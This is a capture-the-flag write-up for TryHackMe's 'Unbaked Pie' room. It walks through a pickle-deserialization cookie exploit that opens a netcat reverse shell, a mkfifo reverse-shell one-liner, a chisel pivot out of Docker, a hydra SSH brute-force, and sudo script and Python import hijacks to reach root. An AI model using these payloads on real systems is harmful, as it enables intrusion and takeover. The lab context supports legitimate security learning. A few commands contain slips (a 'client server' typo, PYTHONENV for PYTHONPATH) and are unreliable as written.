# Unbaked Pie

https://tryhackme.com/room/unbakedpie

A fun room, with a pickle deserialization vector, internal pivot, and several python vulnerabilities. This room was somewhat special for me because I tried it several times over the last year, each time finding it slightly beyond my capabilities. Specifically the pivot, which I only really mastered (enough to do it casually) after the [Wreath](https://www.tryhackme.com/room/wreath) network.

## Foothold

Enumeration revealed a single port, 5003. On that port was a website talking about pies and pickles, nice puns around python and the pickle serialization library. Sure enough, the search functionality would set a cookie with a pickle value.

Exploiting this is a bit tricky, mainly because the website didn't respond to malformed cookies (it instead would crash generally if the search page is accessed via a GET). This deflected me for a bit, as I tried to find the right place where the cookie value was read. However, in actuality the value IS read on the GET /search, it just crashes anyway, so replacing the cookie and requesting this page is the entry point.

The second issue was that the standard `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f` would fail, but I eventually discovered that plain `nc -e /bin/bash` worked. Always worth testing, even if this is rare.

So, finally, the python3 script I used to generate a new cookie value was:

```python3
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('nc -e /bin/bash 10.10.101.125 4444')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

## Docker escape

After getting a shell, I was root in a docker container running at 172.17.0.2, confirmed via `ip a` and `hostname -i`. Exploring, I found /root/.bash_history hadn't been cleared, and in there, there were references to ssh'ing into ramsey@172.17.0.1, but also to ssh being removed from the box which I confirmed.

So this was the pivot - I needed to get 172.17.0.1:22 accessible from my attack box. To do this I used chisel: https://github.com/jpillora/chisel.

On the attack box I started a server with `client server -p 1337 --reverse &`, while on the docker container after downloading chisel to it via wget, I used `chisel client 10.10.101.125:1337 R:2222:172.17.0.1:22 &`. This opened, on the attack box, `127.0.0.1:2222` pointing at the internal machine.

Next, with ramsey as the user, I cracked the password using hydra: `hydra -l ramsey -P rockyou.txt 127.0.0.1 -s 2222 -t 4 ssh`, which got the password pretty quickly. I was then able to ssh in via `ssh -p 2222 ramsey@127.0.0.1`.

## Ramsey to Oliver

The user flag was in ramsey's folder. Running sudo -l revealed `(oliver) /usr/bin/python /home/ramsey/vuln.py`. 

Opening vuln.py, it was interesting: aside from a basic calculator, it could also use pytesseract to parse the text from an image (payload.png, in ramsey's folder) and pass the result to be evaluated.

I experimented with creating my own image: a white box with black text that would spawn a python shell. However I couldn't get tesseract to parse this correctly, after several attempts. Ultimately, it was unecessary: whether intended or not, vuln.py was in ramsey's folder and deletable, so I removed it and replaced it with a file containing `import pty; pty.spawn('/bin/bash')`. This gave me an oliver shell.

## Oliver to Root

sudo -l as oliver revealed `(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py`.

The setenv flag is a giveaway here: it allows me to set PYTHONPATH when running sudo, which meant if `dockerScript.py` contained any import statements, I could easily escalate to root. Sure enough, `import docker` meant I just put `import pty; pty.spawn('/bin/bash')` into docker.py, and then ran `sudo PYTHONENV=/home/oliver/ /usr/bin/python /opt/dockerScript.py` to get an instant root shell.

The final flag was in /root as normal :)
